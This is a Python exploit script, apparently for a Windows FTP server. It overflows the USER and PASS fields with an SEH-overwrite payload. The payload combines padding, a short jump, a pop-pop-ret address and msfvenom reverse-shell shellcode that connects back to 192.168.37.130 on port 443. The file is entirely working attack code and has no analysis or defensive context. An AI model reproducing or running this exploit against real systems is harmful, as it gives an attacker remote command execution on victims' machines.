#/usr/bin/python
#-*- Coding: utf-8 -*-
import socket
import struct
from struct import pack

# 0x1001B2B6      pop EBP - pop - ret
ret = pack('<L', 0x1001B2B6)

# SEH offsets
seh = "A"*(600 - len(ret))

# nSEH short jump
nseh = "\xEB\x06\x90\x90"

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.37.130 LPORT=443 -b "\x00\x20\x09\x0A\x0D\xFF\x22" -f c
shellcode = (
"\x90\x90\x90\x90\x90\x90"
"\x89\xe2\xda\xdc\xd9\x72\xf4\x58\x50\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x6b\x4c\x78\x68\x6c\x42\x35\x50\x63\x30\x33\x30\x33\x50\x4b"
"\x39\x79\x75\x55\x61\x79\x50\x70\x64\x4c\x4b\x36\x30\x54\x70"
"\x6c\x4b\x66\x32\x54\x4c\x6e\x6b\x51\x42\x77\x64\x6c\x4b\x54"
"\x32\x46\x48\x46\x6f\x78\x37\x30\x4a\x47\x56\x44\x71\x6b\x4f"
"\x4e\x4c\x65\x6c\x51\x71\x43\x4c\x35\x52\x36\x4c\x65\x70\x4b"
"\x71\x5a\x6f\x56\x6d\x77\x71\x38\x47\x6b\x52\x6a\x52\x51\x42"
"\x70\x57\x6c\x4b\x72\x72\x56\x70\x4e\x6b\x61\x5a\x47\x4c\x6c"
"\x4b\x72\x6c\x57\x61\x44\x38\x59\x73\x63\x78\x43\x31\x48\x51"
"\x46\x31\x4e\x6b\x76\x39\x75\x70\x46\x61\x48\x53\x6c\x4b\x53"
"\x79\x32\x38\x4a\x43\x66\x5a\x31\x59\x4e\x6b\x44\x74\x4c\x4b"
"\x75\x51\x39\x46\x56\x51\x49\x6f\x6e\x4c\x59\x51\x6a\x6f\x64"
"\x4d\x67\x71\x79\x57\x55\x68\x6b\x50\x51\x65\x49\x66\x45\x53"
"\x71\x6d\x39\x68\x77\x4b\x63\x4d\x65\x74\x31\x65\x68\x64\x42"
"\x78\x6e\x6b\x56\x38\x65\x74\x35\x51\x4a\x73\x53\x56\x4c\x4b"
"\x66\x6c\x42\x6b\x6e\x6b\x72\x78\x35\x4c\x76\x61\x58\x53\x6c"
"\x4b\x55\x54\x4c\x4b\x36\x61\x4a\x70\x6b\x39\x47\x34\x65\x74"
"\x54\x64\x63\x6b\x61\x4b\x73\x51\x50\x59\x43\x6a\x43\x61\x69"
"\x6f\x6d\x30\x43\x6f\x71\x4f\x52\x7a\x4c\x4b\x44\x52\x4a\x4b"
"\x4c\x4d\x71\x4d\x71\x78\x37\x43\x50\x32\x73\x30\x75\x50\x32"
"\x48\x73\x47\x52\x53\x30\x32\x51\x4f\x33\x64\x42\x48\x50\x4c"
"\x71\x67\x36\x46\x76\x67\x4b\x4f\x48\x55\x4d\x68\x4c\x50\x75"
"\x51\x67\x70\x33\x30\x76\x49\x78\x44\x31\x44\x72\x70\x50\x68"
"\x55\x79\x6b\x30\x52\x4b\x57\x70\x39\x6f\x48\x55\x72\x70\x50"
"\x50\x42\x70\x66\x30\x61\x50\x42\x70\x67\x30\x70\x50\x42\x48"
"\x39\x7a\x64\x4f\x39\x4f\x59\x70\x6b\x4f\x5a\x75\x6e\x77\x71"
"\x7a\x67\x75\x65\x38\x69\x50\x49\x38\x71\x35\x4f\x72\x53\x58"
"\x55\x52\x35\x50\x57\x71\x4d\x6b\x4c\x49\x7a\x46\x70\x6a\x42"
"\x30\x66\x36\x43\x67\x73\x58\x6e\x79\x69\x35\x42\x54\x51\x71"
"\x49\x6f\x78\x55\x6d\x55\x39\x50\x64\x34\x76\x6c\x6b\x4f\x72"
"\x6e\x45\x58\x61\x65\x58\x6c\x63\x58\x58\x70\x58\x35\x69\x32"
"\x31\x46\x4b\x4f\x78\x55\x30\x68\x63\x53\x32\x4d\x55\x34\x35"
"\x50\x4f\x79\x59\x73\x72\x77\x32\x77\x71\x47\x75\x61\x59\x66"
"\x71\x7a\x54\x52\x73\x69\x71\x46\x7a\x42\x69\x6d\x45\x36\x78"
"\x47\x37\x34\x45\x74\x55\x6c\x53\x31\x57\x71\x6e\x6d\x51\x54"
"\x47\x54\x52\x30\x5a\x66\x73\x30\x77\x34\x50\x54\x56\x30\x76"
"\x36\x62\x76\x76\x36\x73\x76\x76\x36\x70\x4e\x53\x66\x62\x76"
"\x61\x43\x56\x36\x70\x68\x51\x69\x4a\x6c\x57\x4f\x6f\x76\x49"
"\x6f\x39\x45\x6d\x59\x49\x70\x62\x6e\x61\x46\x30\x46\x59\x6f"
"\x46\x50\x70\x68\x77\x78\x6c\x47\x77\x6d\x63\x50\x69\x6f\x7a"
"\x75\x4f\x4b\x4c\x30\x6d\x65\x49\x32\x46\x36\x30\x68\x39\x36"
"\x4c\x55\x6d\x6d\x4d\x4d\x49\x6f\x78\x55\x35\x6c\x54\x46\x51"
"\x6c\x57\x7a\x4d\x50\x49\x6b\x39\x70\x70\x75\x53\x35\x6f\x4b"
"\x73\x77\x76\x73\x30\x72\x62\x4f\x53\x5a\x57\x70\x43\x63\x39"
"\x6f\x7a\x75\x41\x41"
)

payload = seh + nseh + ret + shellcode + "\xcc"*(5000 - len(seh) - len(nseh) - len(ret) - len(shellcode))

try:
	s = socket.create_connection(("192.168.37.129", 21))
	s.send("USER "+ payload +"\r\n" )
	print s.recv(4096)
        
	s.send("PASS "+ payload +"\r\n" )
	print s.recv(4096)
	print s.recv(4096)
except e:
	print str(e)
	exit("[+] Couldn't connect")
